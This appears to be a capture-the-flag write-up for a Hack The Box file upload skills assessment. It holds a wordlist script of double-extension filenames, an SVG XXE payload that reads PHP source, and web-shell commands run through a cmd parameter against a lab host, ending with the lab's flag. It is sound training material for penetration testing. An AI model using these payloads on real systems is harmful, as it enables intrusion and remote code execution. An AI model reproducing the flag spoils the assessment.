# Skills Assessment - File Upload Attacks

You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

***

### Extra Exercise

Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.

**Questions**

Try to exploit the upload form to read the flag found at the root directory "/".

```bash
#!/bin/bash
for ext in '.svg' '.php' '.phps' '.php8' '.php7' '.php5' '.php4' '.php3' '.php2' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
echo "shell.jpg$ext" >> php_whitelist_wordlist_small.txt
echo "shell$ext.jpg" >> php_whitelist_wordlist_small.txt
echo "shell$ext" >> php_whitelist_wordlist_small.txt
done
#on burp suite catch the upload image request
#sent to intruder
filename="§shell.png§"
#shell.jpg.svg, shell.svg.jpg, shell.phar.jpg, shell.phtm.jpg, shell.pht.jpg
#do the xxe exploit on upload.php
vim htb.svg.jpg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
#upload it, then decode it as base64
#read the source code, see the upload destination and naming file
http://94.237.55.163:48436/contact/user_feedback_submissions/240306_shell.phar.png
#now upload a shell from repeater
http://94.237.55.163:48436/contact/user_feedback_submissions/240306_shell.phar.png?cmd=id
http://94.237.55.163:48436/contact/user_feedback_submissions/240306_shell.phar.png?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
HTB{m4573r1ng_upl04d_3xpl0174710n} 
```
